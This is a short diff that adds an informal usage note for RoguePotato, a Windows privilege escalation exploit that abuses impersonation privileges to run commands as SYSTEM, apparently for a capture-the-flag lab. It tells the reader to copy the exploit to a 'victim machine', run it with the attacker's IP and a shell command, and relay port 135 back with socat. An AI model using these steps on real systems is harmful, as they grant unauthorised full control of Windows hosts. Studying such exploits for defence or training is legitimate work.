@@ -1,0 +1,10 @@
+Rogue_Potato
+
+this is a improved to juicy potato 
+JuicyPotato abused SeImpersonate or SeAssignPrimaryToken privileges to get execution as SYSTEM. It is actually an improved and more flexible adaptation of RottenPotatoNG and lonelypotato. so Rogue potato is the solution 
+
+1- download zipfile and unzip it after that transfer both files to the victim machine 
+2- run .\RoguePotato.exe -r your_ip -e "cmd.exe /c ping 10.10.14.9" "your command and for sure the shell " -l 9999(any port)
+   thats will send a tcp packet to yourip to 135 port so you want to take it back to port 9999 for the success of exploit 
+   so befor run RoguePotato run socat port forwarding 
+     socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
